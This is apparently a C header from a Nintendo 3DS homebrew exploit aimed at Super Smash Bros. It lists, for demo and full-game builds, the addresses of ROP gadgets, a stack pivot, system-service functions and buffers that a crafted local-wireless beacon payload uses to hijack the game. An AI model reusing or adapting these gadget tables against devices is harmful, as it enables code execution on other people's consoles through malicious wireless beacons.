#ifndef SMASHBROSHAX_H_
#define SMASHBROSHAX_H_

#if APPBUILD==0
//USA/EUR demos(unknown if these are valid for the JPN demos):

#define ADDITIONALDATA_ADR 0x00c9d7d0
#define STACKPIVOT_ADR 0x0012a4f4 //This stack-pivot gadget also exists in spider.
#define POP_PC 0x0010b930
#define POP_R0R4SLIPPC 0x001ca5b4 //pop {r0, r1, r2, r3, r4, sl, ip, pc}
#define POP_R0PC 0x001bb47c //"pop {r0, pc}"

#define ROP_LDRR1R1_STRR1R0 0x0066e23c //"ldr r1, [r1]" "str r1, [r0]" "bx lr"
#define ROP_MOVR1R3_BXIP 0x00769aa0 //"mov r1, r3" "bx ip"
#define ROP_LDRR2R0_SUBR1R2R1_STRR1R0 0x00602404 //"ldr r2, [r0]" "sub r1, r2, r1" "str r1, [r0]" "bx lr"
#define ROP_LDRR1R5_MOVR0R8_BLXR7 0x00b158e4 //"ldr r1, [r5]" "mov r0, r8" "blx r7"

#define MEMCPY 0x0016e350

#define SVCSLEEPTHREAD 0x001acba4

#define SRV_GETSERVICEHANDLE 0x001451f8 //r0=handle*, r1=servname, r2=servlen, r3=0

#define NWMUDS_RecvBeaconBroadcastData 0x00314860 //r0=outbuf, r1=size, r2=u8id, r3=wlancommID

#define LOCALWLAN_SHUTDOWN 0x003158bc //Calls nwmuds_shutdown code and some ndmu code.

#define GSPGPU_SERVHANDLEADR 0x00c119b8
#define GSPGPU_FLUSHDCACHE 0x0015cea4

#define GXLOW_CMD4 0x00171cc8

#define TEXT_APPMEM_OFFSET 0x00b00000 //Offset for physical-mem .text, relative to application mem-region end.

#define ADDITONALDATA_SIZE1 0x18A0

#elif APPBUILD==100//Full-game v1.0.0.

#if REGION==3//JPN
#define STACKPIVOT_ADR 0x0012e264

#error "This appbuild+region isn't fully supported."
#else
#define ADDITIONALDATA_ADR 0x00be37e8
#define STACKPIVOT_ADR 0x0012e268
#define POP_PC 0x0010dcc0
#define POP_R0R4SLIPPC 0x001d75b4
#define POP_R0PC 0x001c84e4

#define ROP_LDRR1R1_STRR1R0 0x00354094
#define ROP_MOVR1R3_BXIP 0x0057c6f4
#define ROP_LDRR2R0_SUBR1R2R1_STRR1R0 0x005df8b8
#define ROP_LDRR1R5_MOVR0R8_BLXR7 0x00a761e8

#define MEMCPY 0x00175d98

#define SVCSLEEPTHREAD 0x001b6008

#define SRV_GETSERVICEHANDLE 0x0014a000

#define NWMUDS_RecvBeaconBroadcastData 0x0035df7c

#define LOCALWLAN_SHUTDOWN 0x0035efd8

#define GSPGPU_SERVHANDLEADR 0x00b5b428
#define GSPGPU_FLUSHDCACHE 0x00163f44

#define GXLOW_CMD4 0x00179a5c

#endif

#define TEXT_APPMEM_OFFSET 0x00a00000

#define ADDITONALDATA_SIZE1 0x2092

#elif APPBUILD==102//Full-game v1.0.2.

#define ADDITIONALDATA_ADR 0x00be57e8
#define STACKPIVOT_ADR 0x0012dfd0
#define POP_PC 0x0010dbf4
#define POP_R0R4SLIPPC 0x001d63b4
#define POP_R0PC 0x001c721c

#define ROP_LDRR1R1_STRR1R0 0x0035309c
#define ROP_MOVR1R3_BXIP 0x0057c59c
#define ROP_LDRR2R0_SUBR1R2R1_STRR1R0 0x005dfb54
#define ROP_LDRR1R5_MOVR0R8_BLXR7 0x00a782fc

#define MEMCPY 0x00174e34

#define SVCSLEEPTHREAD 0x001b4d8c

#define SRV_GETSERVICEHANDLE 0x001495e8

#define NWMUDS_RecvBeaconBroadcastData 0x0035cf84

#define LOCALWLAN_SHUTDOWN 0x0035dfe0

#define GSPGPU_SERVHANDLEADR 0x00b5d440
#define GSPGPU_FLUSHDCACHE 0x00162d58

#define GXLOW_CMD4 0x00178af4

#define TEXT_APPMEM_OFFSET 0x00a00000

#define ADDITONALDATA_SIZE1 0x2092

#else
#error "The specified APPBUILD value is not supported."
#endif

#define POP_LRPC STACKPIVOT_ADR+0x18
#define MOVSPLR_POPLRPC STACKPIVOT_ADR+0x14 //"mov sp, lr" "pop {lr, pc}"

#if APPBUILD==0//demo
#define TMPBUF_ADR 0x33F50000
#else//full-game
#define TMPBUF_ADR 0x33E18000//Full-game linearmem heap is smaller than the demo.
#endif

#define GXLOWCMD4_DSTADR_PTR TMPBUF_ADR+0x6000 //The value stored here is the dst-addr for gxlowcmd4.
#define BEACONDATA_ADR TMPBUF_ADR+0x4000 //ADDITIONALDATA_ADR+0xb8
#define BEACONTAGDATA_OUITYPE80_OFFSET (0xc + 0x1c + 0x1bc)
#define BEACONTAGDATA_OUITYPE80_ADR (BEACONDATA_ADR + BEACONTAGDATA_OUITYPE80_OFFSET) //Offset 0x0 in the tag-data in the tag for OUI type 0x80(from smashbros_beacon_rop_payload.s).

#endif

